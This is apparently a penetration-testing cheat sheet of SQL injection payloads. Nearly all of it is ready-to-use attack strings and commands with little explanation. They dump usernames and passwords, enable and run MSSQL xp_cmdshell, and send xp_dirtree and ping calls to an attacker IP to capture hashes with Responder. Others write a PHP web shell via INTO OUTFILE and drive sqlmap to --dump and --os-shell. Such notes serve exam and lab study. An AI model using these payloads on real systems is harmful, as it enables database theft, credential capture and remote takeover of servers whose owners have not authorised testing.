# Error-based SQLi

- https://www.php.net/manual/en/reserved.variables.php
- https://tib3rius.com/sqli.html

```sql
offsec' OR 1=1 -- //

' or 1=1 in (select @@version) -- //

' OR 1=1 in (SELECT * FROM users) -- //

' or 1=1 in (SELECT password FROM users) -- //

' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

# UNION-based Payloads

For **UNION** SQLi attacks to work, we first need to satisfy two conditions:

1. The injected **UNION** query has to include the same number of columns as the original query.
2. The data types need to be compatible between each column.

```sql
' ORDER BY 1-- //
' ORDER BY 2-- //
' ORDER BY 3-- //
...

' or 1=1 in (SELECT password FROM users) -- //

%' UNION SELECT database(), user(), @@version, null, null -- //

0 UNION SELECT database(), null, null -- //

' UNION SELECT null, null, database(), user(), @@version  -- //

' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

' UNION SELECT null, username, password, description, null FROM users -- //

' UNION SELECT 'nurhodelta','password','c','d','f','a','a' -- &password=password&login=
```

# Blind SQL Injections

Although "boolean-based" might not seem like a blind SQLi variant, the output used to infer results comes from the web application, not the database itself.

```sql
http://$IP/blindsqli.php?user=offsec' AND 1=1 -- //

http://$IP/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //
```

If time-based SQLi works and the database is MSSQL, you could try with the following payload:

```sql
EXEC xp_cmdshell 'ping $KALI_IP';--
  
'To be used in conjunction with Responder'
EXEC xp_dirtree \\$IP_MIO\\\test
EXEC xp_dirtree '\\$IP_MIO\\\test'; -- - 
```

To verify that the command is executed:

```bash
sudo tcpdump -i eth0    
```

# Manual Code Execution

```bash
impacket-mssqlclient Administrator:password@$IP -windows-auth
```

```sql
EXECUTE sp_configure 'show advanced options', 1;

RECONFIGURE;

EXECUTE sp_configure 'xp_cmdshell', 1;

RECONFIGURE;

EXECUTE xp_cmdshell 'whoami';

' UNION SELECT "<?php sIst3m($_G3T['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

# Automating the Attack

## sqlmap

```bash
sqlmap -u http://$IP/blindsqli.php?user=1 -p user

sqlmap -u http://$IP/blindsqli.php?user=1 -p user --dump

sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"

sqlmap --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" -r request.txt --proxy http://127.0.0.1:8080 --dump
```